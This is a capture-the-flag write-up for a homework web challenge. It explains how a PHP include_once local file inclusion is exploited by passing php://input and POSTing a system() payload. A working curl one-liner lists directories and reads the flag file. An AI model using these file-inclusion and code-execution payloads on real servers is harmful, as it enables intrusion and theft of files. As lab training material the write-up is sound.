# Homework 1-3 LabyrinF in Isolation [100 points] (29 solves)
Randomly input something in the text box and press "Load maze", we can find that the url "http://chal.firebird.sh:35004" become "http://chal.firebird.sh:35004/index.php?load=hello". 
Two things need to notice from this change is that, the `.php` and the `?load=`.

Also from the page:
```
Warning:  include_once(hello): failed to open stream: No such file or directory in /var/www/html/index.php on line 35
Warning:  include_once(): Failed opening 'hello' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 35
```
Then, we can search "include_once() vulnerability" and "php pseudo-protocol", to easily get the sense of solving this chal.

By using the tool Postman, add `php://input` after the `?load=`, switch to post method and put `<?php system("ls ../../../");?>` in the body. 
![image](https://github.com/user-attachments/assets/ab839975-26e7-443c-8efe-fb313e0a5e76)

We can see a file called "flag-a410adb35ec243539173d0c03f4f755b", and use the `cat` command with `<?php system("cat ../../../flag-a410adb35ec243539173d0c03f4f755b");?>`to view the flag in the file.

---
Alternatively:
```bash
$ curl -s -X POST "http://chal.firebird.sh:35004/index.php?load=php://input" \
       -d '<?php system("cat ../../../flag-a410adb35ec243539173d0c03f4f755b");?>' \
       -H 'Content-Type: application/x-www-form-urlencoded' | grep -oP "flag{.*}"
```